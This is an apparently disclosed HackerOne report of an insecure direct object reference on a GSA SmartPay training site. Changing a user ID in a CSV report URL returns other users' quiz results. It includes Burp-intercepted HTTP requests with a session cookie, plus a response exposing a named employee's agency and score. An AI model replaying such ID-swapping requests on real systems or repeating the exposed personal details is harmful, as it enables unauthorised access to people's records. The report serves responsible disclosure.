# IDOR at training.smartpay.gsa.gov/reports/quizzes-taken-by-user

## Report Details
- **Report ID**: 1118638
- **URL**: https://hackerone.com/reports/1118638
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-06T07:01:07.473Z
- **Disclosed**: 2021-04-24T06:12:17.676Z

## Reporter
- **Username**: alihassam95
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_vdp

## Vulnerability Information
Hey,
I found an IDOR that allow anyone view other user result by changing USERID parameter.
/reports/quizzes-taken-by-user.csv/USERID

Step to Produce:
Go to the Section quizzes-taken-by-user as Shown in the Screenshot attached.
Step 2:
Click on Download CSV.
Step 3
Intercept the Request using the Burp Suite.
Step 4
Change the USERID.
/reports/quizzes-taken-by-user.csv/USERID
Attacker UserID:1226357
Victim USerID: 1226356

HTTP Request:

GET /reports/quizzes-taken-by-user.csv/1226357?page&_format=csv HTTP/1.1
Host: training.smartpay.gsa.gov
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://training.smartpay.gsa.gov/reports/quizzes-taken-by-user
Cookie: SSESS28e7f609ef3740479765aac8be8703ba=xzcTawn0KZkMPGcsSl2KlRBSwOH8PJDmJ5BpAKI5yNA
Upgrade-Insecure-Requests: 1


Change the User ID from 1226357 to 1226356


GET /reports/quizzes-taken-by-user.csv/1226356?page&_format=csv HTTP/1.1
Host: training.smartpay.gsa.gov
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://training.smartpay.gsa.gov/reports/quizzes-taken-by-user
Cookie: SSESS28e7f609ef3740479765aac8be8703ba=xzcTawn0KZkMPGcsSl2KlRBSwOH8PJDmJ5BpAKI5yNA
Upgrade-Insecure-Requests: 1


HTTP Response for 1226356:

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 06:48:40 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
X-Content-Type-Options: nosniff
Cache-Control: must-revalidate, no-cache, private
Content-Disposition: attachment; filename="quizzes-taken-by-user.csv"
X-Drupal-Dynamic-Cache: UNCACHEABLE
X-UA-Compatible: IE=edge
Content-language: en
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Expires: Sun, 19 Nov 1978 05:00:00 GMT
X-Generator: Drupal 8 (https://www.drupal.org)
Access-Control-Allow-Credentials: true
Content-Length: 218
Connection: close
Content-Type: text/csv; charset=UTF-8

"First Name","Last Name",Agency,Title,Score,Started,Completed
Sharon,Cly-Stryker,"Department of the Interior","GSA SmartPay Travel Account (Account Holders/AOs)",100%,"Sat, 03/06/2021 - 00:44","Sat, 03/06/2021 - 01:29"

HTTP Response for 1226357
 
HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 06:49:48 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
X-Content-Type-Options: nosniff
Cache-Control: must-revalidate, no-cache, private
Content-Disposition: attachment; filename="quizzes-taken-by-user.csv"
X-Drupal-Dynamic-Cache: UNCACHEABLE
X-UA-Compatible: IE=edge
Content-language: en
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Expires: Sun, 19 Nov 1978 05:00:00 GMT
X-Generator: Drupal 8 (https://www.drupal.org)
Access-Control-Allow-Credentials: true
Content-Length: 0
Connection: close
Content-Type: text/csv; charset=UTF-8

## Impact

Confidentiality will Compromised

## Attachments
- 1.PNG
